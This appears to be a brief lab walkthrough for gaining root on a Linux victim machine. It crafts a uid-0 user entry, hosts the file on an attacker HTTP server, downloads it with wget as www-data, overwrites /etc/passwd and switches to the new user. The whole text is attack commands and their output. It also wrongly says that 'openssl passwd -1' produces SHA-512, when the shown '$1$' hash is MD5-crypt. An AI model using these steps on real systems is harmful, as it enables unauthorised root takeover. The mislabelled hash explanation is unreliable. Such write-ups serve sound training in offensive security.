## Generate a salted SHA-512 password hash using OpenSSL on your Kali Machine
```
openssl passwd -1 -salt new 123
```
- `openssl passwd`: This command is used to generate password hashes using OpenSSL.
    
- `-1`: This option specifies that the SHA-512 algorithm should be used to generate the password hash.
    
- `-salt new`: This option specifies the salt value to be used for salting the password hash. In this case, the salt value is "new".
    
- `123`: This is the plaintext password that you want to hash.
`$1$new$p7ptkEKU1HnaHpRtzNizS1`


## Add the hash to the passwd file
`echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> passwd`

## Open an HTTP Server
```
python3 -m http.server 80
```

## Get the passwd file from the victim machine
`www-data@ip-10-200-113-12:/var/www/html$ cd /tmp`
`www-data@ip-10-200-113-12:/tmp$ wget http://<kali machine IP>/passwd`

## Copy the passwd file to /etc/passwd
`sudo cp passwd /etc/passwd`

`cat /etc/passwd`
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash


## Change user
`su new`
Password: 123


